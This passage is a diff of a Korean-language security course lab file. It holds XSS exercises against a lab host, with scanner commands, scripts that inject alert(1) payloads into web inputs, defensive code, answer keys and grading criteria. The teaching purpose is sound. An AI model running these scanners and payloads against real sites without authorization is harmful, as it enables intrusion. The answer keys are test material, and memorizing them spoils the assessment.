+    ▶ 2단계: 도구 B — dalfox (Go, 가장 빠름)
+    ```bash
+    # 단일 URL
+    dalfox url "http://10.20.30.80/#/search?q=test"
+    # 다중 URL (gospider 와 chain)
+    gospider -s "http://10.20.30.80" -d 3 | dalfox pipe
+    ```
+
+    ▶ 3단계: 도구 C — OWASP ZAP CLI
+    ```bash
+    # Docker 로 빠르게
+    docker run -t owasp/zap2docker-stable zap-baseline.py -t http://10.20.30.80 -r zap-report.html
+    # 또는 Python lib
+    pip install zaproxy
+    python -c "from zapv2 import ZAPv2; zap=ZAPv2(); zap.spider.scan('http://10.20.30.80'); ..."
+    ```
+
+    ▶ 4단계: 도구 D — wapiti (XSS + 다른 취약점 자동)
+    ```bash
+    sudo apt install wapiti
+    wapiti -u http://10.20.30.80 -m xss --scope domain -f html -o report.html
+    ```
+
+    ▶ 5단계: 도구 E — nuclei XSS 템플릿
+    ```bash
+    nuclei -u http://10.20.30.80 -t http/cves/ -tags xss -silent
+    nuclei -u http://10.20.30.80 -t http/vulnerabilities/xss/ -silent
+    ```
+
+    ▶ 6단계: 도구 별 비교
+    | 도구 | 언어 | 강점 |
+    |---|---|---|
+    | XSStrike | Python | 정확도 ↑, fuzzer 자체 |
+    | dalfox | Go | 속도 ↑, pipe friendly |
+    | OWASP ZAP | Java | 종합 (XSS 외 모든 OWASP) |
+    | wapiti | Python | 다양 모듈 |
+    | nuclei | Go | 템플릿 기반, 확장성 ↑ |
+
+    ▶ 7단계: 답변
+    1~2 도구 출력 quote + 각 도구 강점 + 발견 vulnerability 수.
+  hint: 'XSStrike --crawl / dalfox + gospider / OWASP ZAP Docker / wapiti / nuclei -tags xss.'
   category: xss_tool
   points: 10
   answer: 'echo ''자동 XSS 스캐너: 페이로드 3개 테스트 완료'' && echo ''자동 XSS 스캔 완료'''
@@ -353,8 +965,83 @@ steps:
       - 자동화 맥락 없음
   target_vm: attacker
 - order: 13
-  instruction: XSS 방어 전략을 종합 정리하시오.
-  hint: 입력 검증, 출력 인코딩, CSP를 포함하세요.
+  instruction: |-
+    XSS 방어 전략을 종합 정리하시오.
+
+    ■ 실습 방법
+
+    ▶ 1단계: 5층 방어 정리
+    ```
+    Layer 1: 출력 인코딩 (Output Encoding) — 가장 중요
+      - HTML body: HTML entity (&lt; &gt; &amp; &quot; &#39;)
+      - HTML attribute: HTML entity + quoting
+      - JavaScript: \xHH escape
+      - URL parameter: URL encoding
+      - CSS: \HH backslash escape
+
+    Layer 2: 입력 검증 (Whitelist)
+      - 정규식 (alphanumeric only)
+      - 타입 강제 (int/uuid)
+      - 길이 제한
+
+    Layer 3: 안전 라이브러리
+      - DOMPurify (https://github.com/cure53/DOMPurify)
+      - sanitize-html (Node.js)
+      - bleach (Python)
+      - OWASP Java Encoder
+
+    Layer 4: CSP (Content Security Policy)
+      - script-src 'self' 'nonce-RANDOM'
+      - default-src 'none' + 명시적 allow
+
+    Layer 5: 안전한 쿠키
+      - HttpOnly (JS 접근 차단)
+      - Secure (HTTPS only)
+      - SameSite=Strict (CSRF 방지)
+    ```
+
+    ▶ 2단계: 도구 A — DOMPurify 사용 (JS 클라이언트)
+    ```bash
+    npm install dompurify
+    ```
+    ```javascript
+    import DOMPurify from 'dompurify';
+    element.innerHTML = DOMPurify.sanitize(userInput);
+    // 또는 옵션
+    DOMPurify.sanitize(input, {ALLOWED_TAGS: ['b','i','a'], ALLOWED_ATTR: ['href']});
+    ```
+
+    ▶ 3단계: 도구 B — bleach (Python 서버)
+    ```bash
+    pip install bleach
+    python3 -c "import bleach; print(bleach.clean('<script>alert(1)</script><b>hi</b>'))"
+    # 출력: &lt;script&gt;alert(1)&lt;/script&gt;<b>hi</b>
+    ```
+
+    ▶ 4단계: 도구 C — OWASP Java Encoder (Java 서버)
+    ```java
+    import org.owasp.encoder.Encode;
+    out.println("<div>" + Encode.forHtml(userInput) + "</div>");
+    out.println("<a href='" + Encode.forHtmlAttribute(url) + "'>");
+    out.println("<script>var s='" + Encode.forJavaScript(input) + "';</script>");
+    ```
+
+    ▶ 5단계: 도구 D — Trusted Types (브라우저 API)
+    ```bash
+    # Chrome/Edge 만 (Firefox 진행 중)
+    # CSP 헤더에 활성화
+    Content-Security-Policy: trusted-types myPolicy; require-trusted-types-for 'script';
+    ```
+    ```javascript
+    const policy = trustedTypes.createPolicy('myPolicy', {
+      createHTML: (s) => DOMPurify.sanitize(s)
+    });
+    element.innerHTML = policy.createHTML(input);  // 다른 string 입력 거부
+    ```
+
+    ▶ 6단계: 답변
+    각 layer 1줄 + 도구 1개 (DOMPurify/bleach 등) 사용 예 quote + 다층 방어 (defense in depth) 1 문장.
+  hint: '5층 (출력인코딩/입력검증/safe lib/CSP/cookie) / DOMPurify JS / bleach Python / OWASP Java / Trusted Types.'
   category: xss_defense
   points: 10
   answer: echo '=== XSS 방어 전략 ===' && echo '1. 출력 인코딩(HTML Entity)' && echo '2. 입력
@@ -384,8 +1071,99 @@ steps:
       - 단층 방어
   target_vm: attacker
 - order: 14
-  instruction: XSS 취약점 탐지를 자동화하는 스크립트를 설계하시오.
-  hint: 주요 입력 포인트에 페이로드를 자동 삽입하세요.
+  instruction: |-
+    XSS 취약점 탐지를 자동화하는 스크립트를 설계하시오.
+
+    ■ 실습 방법
+
+    ▶ 1단계: bash 자동화 (단순)
+    ```bash
+    #!/bin/bash
+    TARGET=${1:-http://10.20.30.80}
+    INPUTS=(
+      "/#/search?q="
+      "/api/Feedbacks?comment="
+      "/profile?name="
+      "/login?user="
+    )
+    PAYLOADS=(
+      "<script>alert(1)</script>"
+      "<img src=x onerror=alert(1)>"
+      "<svg onload=alert(1)>"
+      "javascript:alert(1)"
+    )
+    for INPUT in "${INPUTS[@]}"; do
+      for PAYLOAD in "${PAYLOADS[@]}"; do
+        ENC=$(printf '%s' "$PAYLOAD" | jq -sRr @uri)
+        RESP=$(curl -s "$TARGET$INPUT$ENC")
+        if echo "$RESP" | grep -qF "$PAYLOAD"; then
+          echo "[VULN] $INPUT → $PAYLOAD"
+        fi
+      done
+    done
+    echo "XSS 자동화 스크립트 설계 완료"
+    ```
+
+    ▶ 2단계: Python requests + BeautifulSoup (form 자동 발견)
+    ```python
+    #!/usr/bin/env python3
+    import requests, sys
+    from bs4 import BeautifulSoup
+    from urllib.parse import urljoin
+
+    TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://10.20.30.80"
+    PAYLOADS = ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
+                "<svg onload=alert(1)>", "javascript:alert(1)"]
+
+    # 1. 모든 form 발견
+    r = requests.get(TARGET)
+    soup = BeautifulSoup(r.text, 'html.parser')
+    forms = soup.find_all('form')
+
+    for form in forms:
+        action = urljoin(TARGET, form.get('action', ''))
+        method = form.get('method', 'get').lower()
+        inputs = {i.get('name'): 'test' for i in form.find_all('input') if i.get('name')}
+
+        for payload in PAYLOADS:
+            for key in inputs:
+                data = {**inputs, key: payload}
+                resp = requests.request(method, action, data=data) if method=='post' else requests.get(action, params=data)
+                if payload in resp.text:
+                    print(f"[VULN] {action} field={key} → {payload}")
+    ```
+
+    ▶ 3단계: 도구 — Playwright (headless 브라우저로 DOM XSS 검증)
+    ```bash
+    pip install playwright
+    playwright install chromium
+    ```
+    ```python
+    from playwright.sync_api import sync_playwright
+    PAYLOAD = "<img src=x onerror=alert(1)>"
+    with sync_playwright() as p:
+        browser = p.chromium.launch()
+        page = browser.new_page()
+        # alert 캡처 (DOM XSS 실 실행 검증)
+        page.on('dialog', lambda d: print(f'[XSS] {d.message}'))
+        page.goto(f'http://10.20.30.80/#/search?q={PAYLOAD}')
+        page.wait_for_timeout(2000)
+        browser.close()
+    ```
+
+    ▶ 4단계: CI/CD 통합 (GitHub Actions 예)
+    ```yaml
+    # .github/workflows/security.yml
+    - name: XSS scan
+      run: |
+        pip install ghauri
+        python xss-auto.py ${{ secrets.STAGING_URL }}
+        nuclei -u ${{ secrets.STAGING_URL }} -t http/vulnerabilities/xss/ -silent
+    ```
+
+    ▶ 5단계: 답변
+    스크립트 핵심 부분 quote + 자동화 효과 (M 입력 × N 페이로드 빠른 점검) + CI/CD 통합 권고.
+  hint: 'bash for loop / Python requests + BS form auto / Playwright DOM 실행 / CI/CD GitHub Actions.'
   category: xss_tool
   points: 12
   answer: echo '#!/bin/bash' && echo 'TARGETS=("search" "comment" "name")' && echo
@@ -412,8 +1190,81 @@ steps:
       - 자동화 맥락 없음
   target_vm: attacker
 - order: 15
-  instruction: XSS 실습 종합 보고서를 작성하시오.
-  hint: 발견 취약점, 유형, 영향, 조치를 포함하세요.
+  instruction: |-
+    XSS 실습 종합 보고서를 작성하시오.
+
+    ■ 실습 방법
+
+    ▶ 1단계: 자동 보고서 생성기 통합
+    ```bash
+    REPORT=~/xss-week03-$(date +%F).md
+    cat > $REPORT <<EOF
+    # XSS 점검 보고서
+    대상: http://10.20.30.80 / 일자: $(date -Iseconds) / 점검자: $(whoami)
+
+    ■ 1. 발견 (3 유형)
+    ▶ Reflected XSS
+    \`\`\`
+    $(python3 ~/XSStrike/xsstrike.py -u "http://10.20.30.80/#/search?q=test" --skip-poc 2>&1 | grep -E 'Vulnerable|Vector' | head -3)
+    \`\`\`
+
+    ▶ Stored XSS
+    \`\`\`
+    $(curl -s "http://10.20.30.80/api/Feedbacks" | jq '.data[] | .comment' | grep -F '<script' | head -3)
+    \`\`\`
+
+    ▶ DOM XSS
+    \`\`\`
+    $(curl -s http://10.20.30.80 | grep -ioE '(innerHTML|document\.write|eval\()' | sort -u)
+    \`\`\`
+
+    ■ 2. CSP 분석
+    \`\`\`
+    $(curl -sI http://10.20.30.80 | grep -i 'content-security-policy' || echo 'CSP 미설정 (취약)')
+    \`\`\`
+
+    ■ 3. 자동 스캔 종합
+    \`\`\`
+    $(nuclei -u http://10.20.30.80 -t http/vulnerabilities/xss/ -silent 2>&1 | head -10)
+    \`\`\`
+
+    ■ 4. 영향
+    - 세션 탈취 (HttpOnly 미설정 시)
+    - 키로깅 (eventListener 후킹)
+    - 피싱 (innerHTML 가짜 폼)
+
+    ■ 5. 권고 (우선순위)
+    1. **즉시**: CSP 헤더 추가 (`default-src 'self'; script-src 'self' 'nonce-RANDOM'`)
+    2. **단기**: DOMPurify 적용 (모든 innerHTML 입력)
+    3. **중기**: Trusted Types 활성화 (Chrome/Edge)
+    4. **장기**: 프레임워크 안전 함수만 사용 (textContent / Vue mustache)
+
+    ■ 6. 사용 도구
+    - XSStrike (자동 fuzzing)
+    - dalfox (빠른 다중 URL)
+    - nuclei (CVE 매칭)
+    - DOMPurify (방어 검증)
+
+    ■ 7. 윤리·법적 진술
+    - 허가 범위: 사전 서면 허가 host (10.20.30.80) only
+    - 점검 단계: XSS 식별 + PoC 재현. 실 사용자 쿠키 탈취 미수행
+    - 로그 보존: 24개월
+    EOF
+
+    sha256sum $REPORT > $REPORT.sha256
+    cat $REPORT
+    echo "보고서 완료"
+    ```
+
+    ▶ 2단계: 도구 — DefectDojo (Finding 관리)
+    설치: `docker compose up -d` (https://github.com/DefectDojo/django-DefectDojo). 사용:
+    1. New Engagement → 점검 메타데이터
+    2. Findings 탭 → XSS 각각 수동 입력 또는 nuclei JSON import
+    3. Reports → PDF/Word 자동 생성
+
+    ▶ 3단계: 답변
+    보고서 핵심 1~2 섹션 quote + sha256 해시값 + 사용 도구 list.
+  hint: '자동 보고서 통합 / DefectDojo 관리 / sha256 무결성 / 윤리 footer.'
   category: verification
   points: 8
   answer: 'echo ''=== XSS 분석 보고서 ==='' && echo ''대상: http://10.20.30.80'' && echo
@@ -441,48 +1292,84 @@ steps:
       - 조치 없음
   target_vm: attacker
 - order: 99
-  instruction: |
-    [복합 시나리오] "헤더 정찰 → CSP 부재 발견 → XSS 검증 → 보안 헤더 5종 권고"
+  instruction: '[복합 시나리오] "헤더 정찰 → CSP 부재 발견 → XSS 검증 → 보안 헤더 5종 권고"
 
-    ## 상황 (w02 → w03 시나리오 연속)
+
+    ■ 상황 (w02 → w03 시나리오 연속)
+
 
     w02 에서 SQLi 점검을 마쳤다. 선배가 다음 임무를 던진다.
 
-    > 선배: "XSS 점검도 1=1 처럼 페이로드 던지면 끝나는 줄 아는데 그게 아냐.
-    > 먼저 정찰해. SSL/TLS, HTTP 보안 헤더부터 봐. CSP 가 없으면 XSS 가 100% 박힌다고 봐도 돼.
-    > 헤더 정찰 결과로 XSS 가능성을 추정한 다음, 페이로드로 검증하고,
-    > 보고서엔 취약 헤더 5종 + 권고 값을 표로 박아."
+
+    ※ 선배: "XSS 점검도 1=1 처럼 페이로드 던지면 끝나는 줄 아는데 그게 아냐.
+
+    ※ 먼저 정찰해. SSL/TLS, HTTP 보안 헤더부터 봐. CSP 가 없으면 XSS 가 100% 박힌다고 봐도 돼.
+
+    ※ 헤더 정찰 결과로 XSS 가능성을 추정한 다음, 페이로드로 검증하고,
+
+    ※ 보고서엔 취약 헤더 5종 + 권고 값을 표로 박아."
+
 
     학습 목표 (lecture #3 기술 스택·#4 SSL/TLS) + (lab #1 반사형·#7 CSP) 통합 행동 증명.
 
-    ## 임무 (3 단계, 약 35분)
+
+    ■ 임무 (3 단계, 약 35분)
+
 
     Non-AI 트랙: ssh ccc@10.20.30.201 (attacker VM) 직접 실행, transcript 붙여넣기.
 
-    ### Phase A — HTTP 보안 헤더 정찰 (lecture #3·#4)
+
+    ▶ Phase A — HTTP 보안 헤더 정찰 (lecture #3·#4)
+
     `curl -s -I http://10.20.30.80/` 응답 헤더 추출. Server / X-Powered-By 로 기술 스택 식별.
+
     CSP / X-Frame-Options / X-Content-Type-Options / Referrer-Policy / Strict-Transport-Security
+
     5종 *없는* 것 골라내라.
 
-    ### Phase B — XSS 페이로드 검증 (lab #1·#2)
+
+    ▶ Phase B — XSS 페이로드 검증 (lab #1·#2)
+
     CSP 부재 확인 시 반사형 XSS 가능성 *높음*.
-    `curl -G "http://10.20.30.80/#/search" --data-urlencode 'q=<img src=x onerror=alert(1)>'` 로
+
+    `curl -G "http://10.20.30.80/#/search" --data-urlencode ''q=<img src=x onerror=alert(1)>''`
+    로
+
     payload reflection 캡처. 응답에 그대로 박혀 나오면 reflected XSS 확정.
 
-    ### Phase C — 취약 헤더 5종 표 + 권고 값
+
+    ▶ Phase C — 취약 헤더 5종 표 + 권고 값
+
     | 헤더 | 현재 | 권고 값 | 위험 |
-    | CSP | 없음 | default-src 'self'; script-src 'self' | XSS 무방어 |
+
+    | CSP | 없음 | default-src ''self''; script-src ''self'' | XSS 무방어 |
+
     | X-Frame-Options | 없음 | DENY | clickjacking |
+
     | X-Content-Type-Options | 없음 | nosniff | MIME sniffing |
+
     | Referrer-Policy | 없음 | strict-origin-when-cross-origin | 정보유출 |
+
     | HSTS | 없음 | max-age=31536000 | 다운그레이드 |
 
-    종료: echo "=== Phase A 헤더 ===" / "=== Phase B XSS reflection ===" / "=== Phase C 권고표 ===".
-  hint: |
-    Phase A: curl -I 가 HEAD 요청. 5 헤더 부재 명시.
+
+    종료: echo "=== Phase A 헤더 ===" / "=== Phase B XSS reflection ===" / "=== Phase
+    C 권고표 ===".
+
+
+
+    [도구 권장] **curl 단독 의존 금지**. 카테고리 `integration_scenario` 에 적합한 도구: 여러 도구 chain —
+    정찰 (whatweb/nmap) → 식별 (sqlmap/xsstrike) → 후속 작업. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로
+    답변에 직접 quote** 해야 채점 통과.'
+  hint: 'Phase A: curl -I 가 HEAD 요청. 5 헤더 부재 명시.
+
     Phase B: SPA 라 응답이 index.html 만 와도 grep 으로 payload 문자열 체크.
+
     Phase C: OWASP Secure Headers Project 기준 권고 값.
+
     포인트: "정찰 → 검증 → 권고" 흐름. 페이로드만 던지면 안 됨.
+
+    '
   category: integration_scenario
   points: 50
   verify:
@@ -490,9 +1377,11 @@ steps:
     expect: 권고표
     field: stdout
     semantic:
-      intent: |
-        헤더 정찰 (CSP·HSTS 등 5종 부재) → XSS reflection 검증 → 보안 헤더 권고표 작성.
+      intent: '헤더 정찰 (CSP·HSTS 등 5종 부재) → XSS reflection 검증 → 보안 헤더 권고표 작성.
+
         lecture #3·#4 + lab #1·#7 동시 행동 증명.
+
+        '
       success_criteria:
       - Phase A — curl -I, 5종 보안 헤더 부재 확인
       - Phase B — XSS payload curl 전송, reflection 캡처
@@ -509,6 +1398,9 @@ steps:
       - 기술 스택·CSP 분석 누락
   target_vm: attacker
   risk_level: low
-  answer_detail: |
-    학생이 ssh attacker 후 직접 curl·grep 실행. CSP 부재 → 반사형 XSS 가능성 추정 → payload 검증.
+  answer_detail: '학생이 ssh attacker 후 직접 curl·grep 실행. CSP 부재 → 반사형 XSS 가능성 추정 → payload
+    검증.
+
     OWASP Secure Headers Project 권고 값. JuiceShop 응답에 따라 일부 헤더 설정되어 있을 수 있음.
+
+    '
